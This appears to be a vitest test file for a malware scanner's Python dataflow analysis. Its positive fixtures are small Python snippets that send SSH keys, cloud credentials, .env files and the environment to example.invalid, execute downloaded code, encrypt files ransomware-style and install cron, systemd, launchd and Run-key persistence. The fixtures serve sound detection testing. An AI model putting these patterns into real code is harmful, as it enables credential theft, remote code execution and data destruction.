import { describe, expect, it } from "vitest";
import { analyzeDataflow, analyzeProgram } from "../src/scanner/dataflow/index.js";
import { createParser } from "../src/scanner/dataflow/parser.js";
import type { SourceFile } from "../src/types.js";

function source(text: string, startLine = 1): SourceFile {
  return { path: "scripts/check.py", language: "python", text, startLine, endLine: startLine + text.split("\n").length - 1 };
}
async function scan(text: string) { return analyzeDataflow([source(text)]); }

const positives: [string, string, string][] = [
  ["helper reads its path parameter", "credential_theft", `import requests
def load(path):
    return open(path).read()
requests.post("https://example.invalid/", data=load("~/.ssh/id_rsa"))`],
  ["whole environment iteration", "data_exfiltration", `import os, requests
values = [os.environ[name] for name in os.environ]
requests.post("https://example.invalid/", json=values)`],
  ["filesystem walk dump", "data_exfiltration", `import os, requests
requests.post("https://example.invalid/", json=list(os.walk("fixtures")))`],
  ["aliased container mutation", "data_exfiltration", `import requests
payload = object()
alias = payload
payload.value = open(".env").read()
requests.post("https://example.invalid/", data=alias)`],
  ["string format credential path", "credential_theft", `import requests
path = "~/{}/id_rsa".format(".ssh")
requests.post("https://example.invalid/", data=open(path).read())`],
  ["string join credential path", "credential_theft", `import requests
path = "/".join(["~", ".ssh", "id_rsa"])
requests.post("https://example.invalid/", data=open(path).read())`],
  ["urllib response executed", "remote_code_execution", `from urllib.request import urlopen
exec(urlopen("https://example.invalid/fixture").read())`],
  ["session constructor", "data_exfiltration", `import requests
session = requests.Session()
session.post("https://example.invalid/", data=open(".env").read())`],
  ["socket instance", "data_exfiltration", `import socket
client = socket.socket()
client.sendall(open(".env").read())`],
  ["rename after XOR", "file_system", `import os
for root, dirs, files in os.walk("fixtures"):
    for name in files:
        path = os.path.join(root, name)
        value = bytearray(open(path, "rb").read())
        for index in range(len(value)):
            value[index] ^= 42
        os.rename(path, path + ".placeholder")`],
  ["crontab persistence", "persistence", `open("/etc/cron.d/placeholder", "w").write("echo placeholder")`],
  ["launchd persistence", "persistence", `from pathlib import Path
Path("~/Library/LaunchAgents/placeholder.plist").write_text("placeholder")`],
  ["autostart persistence", "persistence", `open("~/.config/autostart/placeholder.desktop", "w").write("placeholder")`],

  ["import alias and with handle", "credential_theft", `import requests as r
with open("~/.ssh/id_rsa") as f:
    data = f.read()
r.post("https://example.invalid/upload", data=data)`],
  ["from import and Path alias", "credential_theft", `from pathlib import Path as P
from requests import post as send
value = P("~/.aws/credentials").read_text()
send("https://example.invalid/upload", json={"value": value})`],
  ["helper parameter to return", "credential_theft", `import requests
def identity(value):
    return value
secret = identity(open(".npmrc").read())
requests.post("https://example.invalid/", data=secret)`],
  ["helper parameter to sink", "credential_theft", `import requests
def send(value):
    requests.post("https://example.invalid/", data=value)
send(open(".netrc").read())`],
  ["f-string URL", "credential_theft", `import requests
secret = open("~/.ssh/id_rsa").read()
requests.get(f"https://example.invalid/{secret}")`],
  ["base64 keeps provenance", "credential_theft", `import base64 as b
import requests
raw = open("~/.docker/config.json").read()
requests.post("https://example.invalid/", data=b.b64encode(raw.encode()))`],
  ["DNS hostname", "credential_theft", `import socket as s
value = open("~/.kube/config").read()
s.gethostbyname(value.hex() + ".example.invalid")`],
  ["whole environment dict", "data_exfiltration", `import os
import requests
requests.post("https://example.invalid/", json=dict(os.environ))`],
  ["environment copy alias", "data_exfiltration", `from os import environ as e
import httpx
httpx.post("https://example.invalid/", json=e.copy())`],
  ["clipboard", "data_exfiltration", `import clipboard
import requests
requests.post("https://example.invalid/", data=clipboard.paste())`],
  ["response executed", "remote_code_execution", `import requests as r
payload = r.get("https://example.invalid/code").text
exec(payload)`],
  ["decoded data executed", "remote_code_execution", `import base64
exec(base64.b64decode("ZWNobyBwbGFjZWhvbGRlcg=="))`],
  ["subprocess shell response", "remote_code_execution", `import subprocess, requests
subprocess.run(requests.get("https://example.invalid/code").text, shell=True)`],
  ["XOR ransomware shape", "file_system", `import os
for root, dirs, files in os.walk("fixtures"):
    for name in files:
        path = os.path.join(root, name)
        data = open(path, "rb").read()
        encoded = bytes([byte ^ 42 for byte in data])
        with open(path, "wb") as out:
            out.write(encoded)`],
  ["crypto ransomware shape", "file_system", `import os
from cryptography.fernet import Fernet
cipher = Fernet(b"placeholder")
for root, dirs, files in os.walk("fixtures"):
    for name in files:
        path = os.path.join(root, name)
        raw = open(path, "rb").read()
        encrypted = cipher.encrypt(raw)
        open(path, "wb").write(encrypted)`],
  ["shell rc persistence", "persistence", `from pathlib import Path
Path("~/.bashrc").write_text("echo placeholder")`],
  ["systemd persistence", "persistence", `with open("/etc/systemd/system/placeholder.service", "w") as f:
    f.write("placeholder")`],
  ["Run key persistence", "persistence", String.raw`import winreg
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, "placeholder", 0, winreg.REG_SZ, "echo placeholder")`],
  ["container mutation", "credential_theft", `import requests
data = {}
data["key"] = open(".git-credentials").read()
requests.post("https://example.invalid/", json=data)`],
  ["attribute mutation", "credential_theft", `import requests
payload = object()
payload.secret = open(".pypirc").read()
requests.post("https://example.invalid/", data=payload)`],
  ["command-line transfer", "credential_theft", `import subprocess
secret = open("~/.ssh/id_rsa").read()
subprocess.run(["curl", "https://example.invalid/", "--data", secret])`],
  ["augmented assignment", "data_exfiltration", `import requests
payload = "prefix"
payload += open(".env").read()
requests.post("https://example.invalid/", data=payload)`],
  ["forward helper chain", "credential_theft", `import requests
def first(value):
    return second(value)
def second(value):
    return value
requests.post("https://example.invalid/", data=first(open(".netrc").read()))`],
];

describe("Python dataflow positives", () => {
  it.each(positives)("%s", async (_name, category, code) => {
    const findings = await scan(code);
    expect(findings.some((f) => f.category === category && (f.severity === "critical" || f.severity === "high")), JSON.stringify(findings)).toBe(true);
    expect(findings.every((f) => f.analysisPass === "dataflow")).toBe(true);
  });
});

const negatives: [string, string][] = [
  ["write-only credential file does not read credentials", `import requests
handle = open(".env", "w")
requests.post("https://example.invalid/", files={"fixture": handle})`],
  ["header parameter through helpers", `import requests, os
def headers(token):
    return {"Authorization": "Bearer " + token}
def send(token):
    requests.get("https://example.invalid/", headers=headers(token))
send(os.getenv("API_TOKEN"))`],
  ["header alias through helpers", `import requests, os
def send(headers):
    requests.get("https://example.invalid/", headers=headers)
send({"X-API-Key": os.getenv("API_KEY")})`],
  ["all branches overwrite a secret", `import requests
value = open(".env").read()
if condition:
    value = "public"
else:
    value = "also public"
requests.post("https://example.invalid/", data=value)`],
  ["urllib downloader saves only", `from urllib.request import urlopen
open("download.txt", "wb").write(urlopen("https://example.invalid/fixture").read())`],

  ["Authorization header", `import os, requests
requests.get("https://example.invalid/", headers={"Authorization": "Bearer " + os.environ["API_TOKEN"]})`],
  ["X-API-Key header", `import os, requests
requests.post("https://example.invalid/", headers={"X-API-Key": os.getenv("API_KEY")}, json={"query": "placeholder"})`],
  ["SDK api_key", `import os
from provider import Client
client = Client(api_key=os.getenv("API_KEY"))`],
  ["SSH config read alone", `data = open("~/.ssh/config").read()`],
  ["AWS config read alone", `data = open("~/.aws/config").read()`],
  ["local archive backup", `import os, zipfile
with zipfile.ZipFile("backup.zip", "w") as archive:
    for root, dirs, files in os.walk("fixtures"):
        for name in files:
            archive.write(os.path.join(root, name))`],
  ["download saved only", `import requests
from pathlib import Path
Path("download.txt").write_bytes(requests.get("https://example.invalid/fixture").content)`],
  ["source without sink", `import os
secret = os.getenv("TOKEN")
raw = open(".env").read()`],
  ["sink without source", `import requests
requests.post("https://example.invalid/", json={"status": "ok"})`],
  ["public environment var", `import os, requests
requests.post("https://example.invalid/", json={"home": os.environ["HOME"]})`],
  ["overwritten secret", `import requests
value = open(".env").read()
value = "public"
requests.post("https://example.invalid/", data=value)`],
  ["unrelated encryption and write", `import os
from cryptography.fernet import Fernet
cipher = Fernet(b"placeholder")
for root, dirs, files in os.walk("fixtures"):
    encrypted = cipher.encrypt(b"public")
    open("local.txt", "w").write("placeholder")`],
  ["decoded value saved only", `import base64
open("local.txt", "wb").write(base64.b64decode("cGxhY2Vob2xkZXI="))`],
  ["unrelated function argument", `import requests
def first(a, b):
    return b
requests.post("https://example.invalid/", data=first(open(".env").read(), "public"))`],
  ["secret source in comment", `import requests
# data = open("~/.ssh/id_rsa").read()
requests.post("https://example.invalid/", data="public")`],
];

describe("Python dataflow negative controls", () => {
  it.each(negatives)("%s", async (_name, code) => { expect(await scan(code)).toEqual([]); });
  it("uses module constants in helper summaries", async () => {
    const findings = await scan(`import os, requests
URL = "https://example.invalid/"
def send(token):
    requests.post(URL, data=token)
send(os.getenv("TOKEN"))`);
    expect(findings).toEqual([expect.objectContaining({ severity: "medium", category: "data_exfiltration" })]);
  });
  it("limits a single secret env var in a body to medium for a literal host", async () => {
    const findings = await scan(`import os, requests\nrequests.post("https://example.invalid/", data=os.getenv("TOKEN"))`);
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({ category: "data_exfiltration", severity: "medium" });
  });
});

describe("dataflow API", () => {
  it("accepts a language-neutral graph and API tables", () => {
    const sourceFile = { ...source(""), language: "javascript" as const };
    const nodes = [
      { id: 0, op: "symbol" as const, name: "clipboard.read", inputs: [], line: 1, loops: [] },
      { id: 1, op: "symbol" as const, name: "transport.send", inputs: [], line: 2, loops: [] },
      { id: 2, op: "call" as const, inputs: [1, 0], args: [{ value: 0 }], line: 2, loops: [] },
    ];
    const findings = analyzeProgram({ source: sourceFile, functions: [], module: { name: "module", nodes, returns: [], parameters: [] } }, {
      accesses: [{ names: /^clipboard\.read$/, source: "clipboard" }],
      calls: [{ names: /^transport\.send$/, effects: ["network"] }],
    });
    expect(findings).toEqual([expect.objectContaining({ category: "data_exfiltration", severity: "critical" })]);
  });
  it("still detects a header secret also placed in the request body", async () => {
    const findings = await scan(`import os, requests
def send(token):
    requests.post("https://example.invalid/", headers={"Authorization": token}, data=token)
send(os.getenv("TOKEN"))`);
    expect(findings).toEqual([expect.objectContaining({ severity: "medium", category: "data_exfiltration" })]);
  });
  it("maps findings to the original scanned content", async () => {
    const findings = await analyzeDataflow([source('import requests\nraw = open(".env").read()\nrequests.post("https://example.invalid/", data=raw)', 40)]);
    expect(findings[0].lineNumber).toBe(42);
    expect(findings[0].evidence).toContain("scripts/check.py:2 read .env -> :3 requests.post");
  });
  it("does not let harmless sends consume flow-event capacity", async () => {
    const noise = Array.from({ length: 90 }, () => 'requests.get("https://example.invalid/public")').join("\n");
    const findings = await scan('import requests\n' + noise + '\nrequests.post("https://example.invalid/", data=open(".env").read())');
    expect(findings).toEqual([expect.objectContaining({ severity: "critical", category: "data_exfiltration" })]);
  });
  it("ignores unsupported languages", async () => {
    expect(await analyzeDataflow([{ ...source('exec("placeholder")'), language: "ruby" }], { budgetMs: 0 })).toEqual([]);
  });
  it("uses partial trees without throwing", async () => {
    await expect(scan('import requests\nraw = open(".env").read()\nrequests.post("https://example.invalid/", data=raw)\ndef broken(:\n')).resolves.toEqual(expect.any(Array));
  });
  it("emits one low severity truncation finding", async () => {
    // `pass` alone names no API a finding needs and is skipped before the budget is consulted.
    const findings = await analyzeDataflow([source("import os"), source("import os")], { budgetMs: 0 });
    expect(findings).toEqual([expect.objectContaining({ severity: "low", analysisPass: "dataflow", title: "Dataflow analysis truncated" })]);
  });
  it("loads the vendored grammar with the pinned runtime", async () => {
    const parser = await createParser("python");
    try {
      expect(parser.language?.abiVersion).toBe(15);
      const tree = parser.parse("value = 1");
      expect(tree?.rootNode.hasError).toBe(false);
      tree?.delete();
    } finally { parser.delete(); }
  });

  describe("audit regressions", () => {
    it("keeps a helper called thousands of times inside the budget", async () => {
      const text = 'import requests\ndef f(v):\n' + ' requests.post("https://example.invalid/",data=v)\n'.repeat(64) + 's=open(".env").read()\n' + 'f(s)\n'.repeat(3000);
      const started = performance.now();
      await analyzeDataflow([source(text)], { budgetMs: 250 });
      // Budget plus slack for one in-flight step; it measured 1,951 ms before the fix.
      expect(performance.now() - started).toBeLessThan(600);
    });
    it("treats a file count sent as telemetry as harmless", async () => {
      const findings = await scan('import os, requests\ncount = len(list(os.walk("photos")))\nrequests.post("https://example.invalid/metrics", json={"count": count})');
      expect(findings.filter((f) => f.severity === "critical" || f.severity === "high")).toEqual([]);
    });
    it("is not hidden by a method sharing the helper's name", async () => {
      const findings = await scan('import requests\ndef send(v):\n    requests.post("https://example.invalid/", data=v)\nclass Local:\n    def send(self, v):\n        print(v)\nsend(open(".env").read())');
      expect(findings).toEqual([expect.objectContaining({ severity: "critical" })]);
    });
    it("is not hidden by redefining the helper harmlessly", async () => {
      const findings = await scan('import requests\ndef send(v):\n    requests.post("https://example.invalid/", data=v)\nsend(open(".env").read())\ndef send(v):\n    print(v)');
      expect(findings).toEqual([expect.objectContaining({ severity: "critical" })]);
    });
    it("follows a value a helper stores into its argument", async () => {
      const findings = await scan('import requests\ndef fill(p):\n    p["value"] = open(".env").read()\npayload = {}\nfill(payload)\nrequests.post("https://example.invalid/", json=payload)');
      expect(findings).toEqual([expect.objectContaining({ severity: "critical" })]);
    });
    it("lets one .env key authenticate a request", async () => {
      const findings = await scan('import json, requests\nconfig = json.load(open(".env.json"))\nrequests.get("https://example.invalid/", headers={"Authorization": config["token"]})');
      expect(findings).toEqual([]);
    });
  });
});
